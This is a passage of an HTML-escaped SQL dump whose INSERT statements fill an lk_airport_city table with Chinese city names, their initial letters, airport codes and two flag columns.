(&#39;157&#39;, &#39;天津&#39;, &#39;T&#39;, &#39;TSN&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;1&#39;, &#39;阿勒泰&#39;, &#39;A&#39;, &#39;AAT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;110&#39;, &#39;林西&#39;, &#39;L&#39;, &#39;LXI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;97&#39;, &#39;喀纳斯&#39;, &#39;K&#39;, &#39;KJI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;23&#39;, &#39;长春&#39;, &#39;C&#39;, &#39;CGQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;155&#39;, &#39;吐鲁番&#39;, &#39;T&#39;, &#39;TLQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;175&#39;, &#39;襄阳&#39;, &#39;X&#39;, &#39;XFN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;191&#39;, &#39;伊宁市&#39;, &#39;Y&#39;, &#39;YIN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;108&#39;, &#39;临沧&#39;, &#39;L&#39;, &#39;LNJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;8&#39;, &#39;阿里&#39;, &#39;A&#39;, &#39;NGQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;78&#39;, &#39;黄山&#39;, &#39;H&#39;, &#39;TXN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;37&#39;, &#39;丹东&#39;, &#39;D&#39;, &#39;DDG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;164&#39;, &#39;文山县&#39;, &#39;W&#39;, &#39;WNH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;122&#39;, &#39;南昌&#39;, &#39;N&#39;, &#39;KHN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;193&#39;, &#39;延吉&#39;, &#39;Y&#39;, &#39;YNJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;197&#39;, &#39;玉树县&#39;, &#39;Y&#39;, &#39;YUS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;171&#39;, &#39;万州&#39;, &#39;W&#39;, &#39;WXN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;204&#39;, &#39;湛江&#39;, &#39;Z&#39;, &#39;ZHA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;152&#39;, &#39;铜仁市&#39;, &#39;T&#39;, &#39;TEN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;135&#39;, &#39;衢州&#39;, &#39;Q&#39;, &#39;JUZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;150&#39;, &#39;塔城&#39;, &#39;T&#39;, &#39;TCG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;58&#39;, &#39;固原&#39;, &#39;G&#39;, &#39;GYU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;143&#39;, &#39;沙市&#39;, &#39;S&#39;, &#39;SHS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;76&#39;, &#39;和田市&#39;, &#39;H&#39;, &#39;HTN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;125&#39;, &#39;南京&#39;, &#39;N&#39;, &#39;NKG&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;115&#39;, &#39;泸州&#39;, &#39;L&#39;, &#39;LZO&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;183&#39;, &#39;银川&#39;, &#39;Y&#39;, &#39;INC&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;109&#39;, &#39;拉萨&#39;, &#39;L&#39;, &#39;LXA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;139&#39;, &#39;日喀则&#39;, &#39;R&#39;, &#39;RKZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;2&#39;, &#39;安康&#39;, &#39;A&#39;, &#39;AKA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;89&#39;, &#39;鸡西&#39;, &#39;J&#39;, &#39;JXA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;90&#39;, &#39;九寨沟&#39;, &#39;J&#39;, &#39;JZH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;45&#39;, &#39;德宏&#39;, &#39;D&#39;, &#39;LUM&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;83&#39;, &#39;金昌&#39;, &#39;J&#39;, &#39;JIC&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;162&#39;, &#39;潍坊&#39;, &#39;W&#39;, &#39;WEF&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;166&#39;, &#39;乌海&#39;, &#39;W&#39;, &#39;WUA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;46&#39;, &#39;鄂尔多斯&#39;, &#39;E&#39;, &#39;DSN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;178&#39;, &#39;西安&#39;, &#39;X&#39;, &#39;SIA&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;103&#39;, &#39;兰州&#39;, &#39;L&#39;, &#39;LHW&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;159&#39;, &#39;太原&#39;, &#39;T&#39;, &#39;TYN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;73&#39;, &#39;海拉尔&#39;, &#39;H&#39;, &#39;HLD&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;86&#39;, &#39;佳木斯&#39;, &#39;J&#39;, &#39;JMU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;149&#39;, &#39;台州&#39;, &#39;T&#39;, &#39;HYN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;133&#39;, &#39;庆阳&#39;, &#39;Q&#39;, &#39;IQN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;198&#39;, &#39;郑州&#39;, &#39;Z&#39;, &#39;CGO&#39;, &#39;1&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;74&#39;, &#39;哈密市&#39;, &#39;H&#39;, &#39;HMI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;9&#39;, &#39;阿拉善右旗&#39;, &#39;A&#39;, &#39;RHT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;55&#39;, &#39;广汉&#39;, &#39;G&#39;, &#39;GHN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;6&#39;, &#39;安顺&#39;, &#39;A&#39;, &#39;AVA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;84&#39;, &#39;九江&#39;, &#39;J&#39;, &#39;JIU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;205&#39;, &#39;中卫&#39;, &#39;Z&#39;, &#39;ZHY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;95&#39;, &#39;喀什市&#39;, &#39;K&#39;, &#39;KHG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;187&#39;, &#39;宜宾&#39;, &#39;Y&#39;, &#39;YBP&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;69&#39;, &#39;合肥&#39;, &#39;H&#39;, &#39;HFE&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;80&#39;, &#39;加格达奇&#39;, &#39;J&#39;, &#39;JGD&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;206&#39;, &#39;张家口&#39;, &#39;Z&#39;, &#39;ZQZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;172&#39;, &#39;兴义&#39;, &#39;X&#39;, &#39;ACX&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;138&#39;, &#39;青岛&#39;, &#39;Q&#39;, &#39;TAO&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;64&#39;, &#39;海口&#39;, &#39;H&#39;, &#39;HAK&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;63&#39;, &#39;红原&#39;, &#39;H&#39;, &#39;AHJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;154&#39;, &#39;天水&#39;, &#39;T&#39;, &#39;THQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;21&#39;, &#39;昌都&#39;, &#39;C&#39;, &#39;BPX&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;68&#39;, &#39;呼和浩特&#39;, &#39;H&#39;, &#39;HET&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;163&#39;, &#39;威海&#39;, &#39;W&#39;, &#39;WEH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;82&#39;, &#39;井冈山&#39;, &#39;J&#39;, &#39;JGS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;101&#39;, &#39;黎平&#39;, &#39;L&#39;, &#39;HZH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;53&#39;, &#39;抚远&#39;, &#39;F&#39;, &#39;FYJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;127&#39;, &#39;南宁&#39;, &#39;N&#39;, &#39;NNG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;129&#39;, &#39;南通&#39;, &#39;N&#39;, &#39;NTG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;62&#39;, &#39;光化&#39;, &#39;G&#39;, &#39;LHK&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;15&#39;, &#39;博乐&#39;, &#39;B&#39;, &#39;BPL&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;142&#39;, &#39;沈阳&#39;, &#39;S&#39;, &#39;SHE&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;176&#39;, &#39;西昌&#39;, &#39;X&#39;, &#39;XIC&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;85&#39;, &#39;晋江&#39;, &#39;J&#39;, &#39;JJN&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;181&#39;, &#39;徐州&#39;, &#39;X&#39;, &#39;XUZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;102&#39;, &#39;龙岩&#39;, &#39;L&#39;, &#39;LCX&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;42&#39;, &#39;东营&#39;, &#39;D&#39;, &#39;DOY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;119&#39;, &#39;梅州&#39;, &#39;M&#39;, &#39;MXZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;87&#39;, &#39;济宁&#39;, &#39;J&#39;, &#39;JNG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;94&#39;, &#39;康定&#39;, &#39;K&#39;, &#39;KGT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;16&#39;, &#39;保山&#39;, &#39;B&#39;, &#39;BSD&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;177&#39;, &#39;锡林浩特&#39;, &#39;X&#39;, &#39;XIL&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;39&#39;, &#39;大连&#39;, &#39;D&#39;, &#39;DLC&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;184&#39;, &#39;伊春&#39;, &#39;Y&#39;, &#39;LDS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;61&#39;, &#39;桂林&#39;, &#39;G&#39;, &#39;KWL&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;161&#39;, &#39;乌鲁木齐&#39;, &#39;W&#39;, &#39;URC&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;26&#39;, &#39;长治&#39;, &#39;C&#39;, &#39;CIH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;13&#39;, &#39;毕节&#39;, &#39;B&#39;, &#39;BFJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;126&#39;, &#39;那拉提&#39;, &#39;N&#39;, &#39;NLT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;60&#39;, &#39;贵阳&#39;, &#39;G&#39;, &#39;KWE&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;44&#39;, &#39;德令哈&#39;, &#39;D&#39;, &#39;HXD&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;17&#39;, &#39;北京&#39;, &#39;B&#39;, &#39;BJS&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;72&#39;, &#39;怀化&#39;, &#39;H&#39;, &#39;HJJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;116&#39;, &#39;林芝&#39;, &#39;L&#39;, &#39;LZY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;10&#39;, &#39;阿尔山&#39;, &#39;A&#39;, &#39;YIE&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;106&#39;, &#39;荔波&#39;, &#39;L&#39;, &#39;LLB&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;12&#39;, &#39;包头&#39;, &#39;B&#39;, &#39;BAV&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;169&#39;, &#39;无锡&#39;, &#39;W&#39;, &#39;WUX&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;57&#39;, &#39;广元&#39;, &#39;G&#39;, &#39;GYS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;27&#39;, &#39;重庆&#39;, &#39;C&#39;, &#39;CKG&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;70&#39;, &#39;杭州&#39;, &#39;H&#39;, &#39;HGH&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;99&#39;, &#39;库尔勒&#39;, &#39;K&#39;, &#39;KRL&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;4&#39;, &#39;鞍山&#39;, &#39;A&#39;, &#39;AOG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;34&#39;, &#39;大同&#39;, &#39;D&#39;, &#39;DAT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;120&#39;, &#39;满洲里&#39;, &#39;M&#39;, &#39;NZH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;18&#39;, &#39;巴彦淖尔&#39;, &#39;B&#39;, &#39;RLK&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;130&#39;, &#39;攀枝花&#39;, &#39;P&#39;, &#39;PZI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;25&#39;, &#39;赤峰&#39;, &#39;C&#39;, &#39;CIF&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;81&#39;, &#39;嘉峪关&#39;, &#39;J&#39;, &#39;JGN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;195&#39;, &#39;盐城&#39;, &#39;Y&#39;, &#39;YNZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;93&#39;, &#39;库车&#39;, &#39;K&#39;, &#39;KCA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;88&#39;, &#39;锦州&#39;, &#39;J&#39;, &#39;JNZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;131&#39;, &#39;普洱&#39;, &#39;P&#39;, &#39;SYM&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;104&#39;, &#39;梁平&#39;, &#39;L&#39;, &#39;LIA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;5&#39;, &#39;安庆&#39;, &#39;A&#39;, &#39;AQG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;140&#39;, &#39;神农架&#39;, &#39;S&#39;, &#39;HPG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;170&#39;, &#39;梧州&#39;, &#39;W&#39;, &#39;WUZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;11&#39;, &#39;百色&#39;, &#39;B&#39;, &#39;AEB&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;113&#39;, &#39;临沂&#39;, &#39;L&#39;, &#39;LYI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;153&#39;, &#39;通辽&#39;, &#39;T&#39;, &#39;TGO&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;202&#39;, &#39;昭通&#39;, &#39;Z&#39;, &#39;ZAT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;180&#39;, &#39;西宁&#39;, &#39;X&#39;, &#39;XNN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;141&#39;, &#39;上海&#39;, &#39;S&#39;, &#39;SHA&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;137&#39;, &#39;秦皇岛&#39;, &#39;Q&#39;, &#39;SHP&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;28&#39;, &#39;长海&#39;, &#39;C&#39;, &#39;CNI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;118&#39;, &#39;绵阳&#39;, &#39;M&#39;, &#39;MIG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;71&#39;, &#39;淮安&#39;, &#39;H&#39;, &#39;HIA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;35&#39;, &#39;达县&#39;, &#39;D&#39;, &#39;DAX&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;92&#39;, &#39;济南&#39;, &#39;J&#39;, &#39;TNA&#39;, &#39;1&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;50&#39;, &#39;福州&#39;, &#39;F&#39;, &#39;FOC&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;112&#39;, &#39;连云港&#39;, &#39;L&#39;, &#39;LYG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;30&#39;, &#39;成都&#39;, &#39;C&#39;, &#39;CTU&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;65&#39;, &#39;河池&#39;, &#39;H&#39;, &#39;HCJ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;194&#39;, &#39;烟台&#39;, &#39;Y&#39;, &#39;YNT&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;75&#39;, &#39;哈尔滨&#39;, &#39;H&#39;, &#39;HRB&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;146&#39;, &#39;深圳&#39;, &#39;S&#39;, &#39;SZX&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;49&#39;, &#39;二连浩特&#39;, &#39;E&#39;, &#39;ERL&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;188&#39;, &#39;运城&#39;, &#39;Y&#39;, &#39;YCU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;158&#39;, &#39;唐山&#39;, &#39;T&#39;, &#39;TVS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;47&#39;, &#39;额济纳旗&#39;, &#39;E&#39;, &#39;EJN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;144&#39;, &#39;石家庄&#39;, &#39;S&#39;, &#39;SJW&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;31&#39;, &#39;常州&#39;, &#39;C&#39;, &#39;CZX&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;186&#39;, &#39;榆林&#39;, &#39;Y&#39;, &#39;UYN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;199&#39;, &#39;张家界&#39;, &#39;Z&#39;, &#39;DYG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;22&#39;, &#39;常德&#39;, &#39;C&#39;, &#39;CGD&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;203&#39;, &#39;中山&#39;, &#39;Z&#39;, &#39;ZGN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;185&#39;, &#39;永州&#39;, &#39;Y&#39;, &#39;LLF&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;196&#39;, &#39;扬州&#39;, &#39;Y&#39;, &#39;YTY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;156&#39;, &#39;通化&#39;, &#39;T&#39;, &#39;TNH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;51&#39;, &#39;阜阳&#39;, &#39;F&#39;, &#39;FUG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;200&#39;, &#39;舟山&#39;, &#39;Z&#39;, &#39;HSN&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;132&#39;, &#39;且末&#39;, &#39;Q&#39;, &#39;IQM&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;98&#39;, &#39;昆明&#39;, &#39;K&#39;, &#39;KMG&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;3&#39;, &#39;阿克苏&#39;, &#39;A&#39;, &#39;AKU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;145&#39;, &#39;三亚&#39;, &#39;S&#39;, &#39;SYX&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;7&#39;, &#39;阿拉善左旗&#39;, &#39;A&#39;, &#39;AXF&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;40&#39;, &#39;大理市&#39;, &#39;D&#39;, &#39;DLU&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;179&#39;, &#39;厦门&#39;, &#39;X&#39;, &#39;XMN&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;151&#39;, &#39;腾冲&#39;, &#39;T&#39;, &#39;TCZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;59&#39;, &#39;赣州&#39;, &#39;G&#39;, &#39;KOW&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;167&#39;, &#39;武汉&#39;, &#39;W&#39;, &#39;WUH&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;48&#39;, &#39;恩施&#39;, &#39;E&#39;, &#39;ENH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;66&#39;, &#39;邯郸&#39;, &#39;H&#39;, &#39;HDG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;189&#39;, &#39;宜春&#39;, &#39;Y&#39;, &#39;YIC&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;160&#39;, &#39;乌兰浩特&#39;, &#39;W&#39;, &#39;HLH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;173&#39;, &#39;夏河&#39;, &#39;X&#39;, &#39;GXH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;33&#39;, &#39;长白山&#39;, &#39;C&#39;, &#39;NBS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;41&#39;, &#39;敦煌&#39;, &#39;D&#39;, &#39;DNH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;29&#39;, &#39;长沙&#39;, &#39;C&#39;, &#39;CSX&#39;, &#39;1&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;56&#39;, &#39;格尔木&#39;, &#39;G&#39;, &#39;GOQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;43&#39;, &#39;大庆&#39;, &#39;D&#39;, &#39;DQA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;91&#39;, &#39;揭阳&#39;, &#39;J&#39;, &#39;SWA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;52&#39;, &#39;佛山&#39;, &#39;F&#39;, &#39;FUO&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;77&#39;, &#39;汉中&#39;, &#39;H&#39;, &#39;HZG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;168&#39;, &#39;武夷山&#39;, &#39;W&#39;, &#39;WUS&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;174&#39;, 